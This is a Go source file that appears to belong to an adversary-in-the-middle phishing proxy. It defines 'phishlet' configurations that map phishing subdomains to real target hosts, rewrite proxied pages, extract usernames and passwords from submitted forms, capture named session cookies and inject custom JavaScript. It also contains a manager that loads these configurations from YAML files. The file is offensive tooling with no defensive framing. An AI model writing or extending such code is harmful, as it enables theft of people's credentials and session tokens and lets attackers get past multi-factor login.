package phishlet

import (
	"fmt"
	"os"
	"path/filepath"

	"gopkg.in/yaml.v3"
)

// Phishlet defines a target application's proxy configuration
type Phishlet struct {
	Name    string `yaml:"name"`
	Author  string `yaml:"author"`
	MinVer  string `yaml:"min_ver"`

	// Proxy host mappings
	ProxyHosts []ProxyHost `yaml:"proxy_hosts"`

	// Content substitution filters
	SubFilters []SubFilter `yaml:"sub_filters"`

	// Credential field definitions
	Credentials CredentialConfig `yaml:"credentials"`

	// Session tokens to capture
	AuthTokens []AuthToken `yaml:"auth_tokens"`

	// Landing paths that trigger the phishing flow
	LandingPaths []string `yaml:"landing_path"`

	// Custom JavaScript to inject
	JSInject string `yaml:"js_inject"`
}

// ProxyHost maps a phishing subdomain to the real target subdomain
type ProxyHost struct {
	PhishSub string `yaml:"phish_sub"`
	OrigSub  string `yaml:"orig_sub"`
	Domain   string `yaml:"domain"`
	Session  bool   `yaml:"session"`
	IsSSL    bool   `yaml:"is_ssl"`
}

// SubFilter defines content replacement rules for proxied responses
type SubFilter struct {
	TriggersOn string   `yaml:"triggers_on"` // Which hostname triggers this filter
	OrigSub    string   `yaml:"orig_sub"`
	Domain     string   `yaml:"domain"`
	Search     string   `yaml:"search"`
	Replace    string   `yaml:"replace"`
	MimeTypes  []string `yaml:"mimes"`
	RedirectOnly bool  `yaml:"redirect_only"`
}

// CredentialConfig defines which POST fields contain credentials
type CredentialConfig struct {
	Username CredentialField `yaml:"username"`
	Password CredentialField `yaml:"password"`
	Custom   []CredentialField `yaml:"custom"` // For non-standard auth flows
}

// CredentialField represents a single credential extraction rule
type CredentialField struct {
	Key    string `yaml:"key"`    // Field name in POST body
	Search string `yaml:"search"` // Regex pattern to extract value
	Type   string `yaml:"type"`   // "post", "json", "header", "cookie"
}

// AuthToken defines session cookies to capture from the target
type AuthToken struct {
	Domain string   `yaml:"domain"` // Cookie domain
	Keys   []string `yaml:"keys"`   // Cookie names to capture
}

// PhishletManager loads and manages phishlet configurations
type PhishletManager struct {
	phishlets map[string]*Phishlet
	dir       string
}

// NewPhishletManager creates a new manager and loads phishlets from the given directory
func NewPhishletManager(dir string) *PhishletManager {
	return &PhishletManager{
		phishlets: make(map[string]*Phishlet),
		dir:       dir,
	}
}

// LoadAll loads all phishlet YAML files from the configured directory
func (pm *PhishletManager) LoadAll() error {
	files, err := filepath.Glob(filepath.Join(pm.dir, "*.yml"))
	if err != nil {
		return fmt.Errorf("failed to glob phishlets: %w", err)
	}

	yamlFiles, err2 := filepath.Glob(filepath.Join(pm.dir, "*.yaml"))
	if err2 == nil {
		files = append(files, yamlFiles...)
	}

	for _, f := range files {
		p, err := loadPhishlet(f)
		if err != nil {
			return fmt.Errorf("failed to load phishlet %s: %w", f, err)
		}
		pm.phishlets[p.Name] = p
	}

	return nil
}

// Get returns a phishlet by name
func (pm *PhishletManager) Get(name string) (*Phishlet, bool) {
	p, ok := pm.phishlets[name]
	return p, ok
}

// List returns all loaded phishlet names
func (pm *PhishletManager) List() []string {
	names := make([]string, 0, len(pm.phishlets))
	for k := range pm.phishlets {
		names = append(names, k)
	}
	return names
}

// GetHostMappings returns a map of phishing hostname → target hostname for a phishlet
func (p *Phishlet) GetHostMappings(phishDomain string) map[string]string {
	mappings := make(map[string]string)
	for _, host := range p.ProxyHosts {
		phishHost := host.PhishSub + "." + phishDomain
		mappings[phishHost] = host.OrigSub
	}
	return mappings
}

// GetSessionDomains returns all domains from which we need to capture cookies
func (p *Phishlet) GetSessionDomains() []string {
	seen := make(map[string]bool)
	var domains []string
	for _, t := range p.AuthTokens {
		if !seen[t.Domain] {
			seen[t.Domain] = true
			domains = append(domains, t.Domain)
		}
	}
	return domains
}

// GetAllAuthCookieKeys returns a flat list of all cookie names to capture
func (p *Phishlet) GetAllAuthCookieKeys() []string {
	var keys []string
	for _, t := range p.AuthTokens {
		keys = append(keys, t.Keys...)
	}
	return keys
}

func loadPhishlet(path string) (*Phishlet, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var p Phishlet
	if err := yaml.Unmarshal(data, &p); err != nil {
		return nil, err
	}

	// Default SSL
	for i := range p.ProxyHosts {
		p.ProxyHosts[i].IsSSL = true
	}

	return &p, nil
}
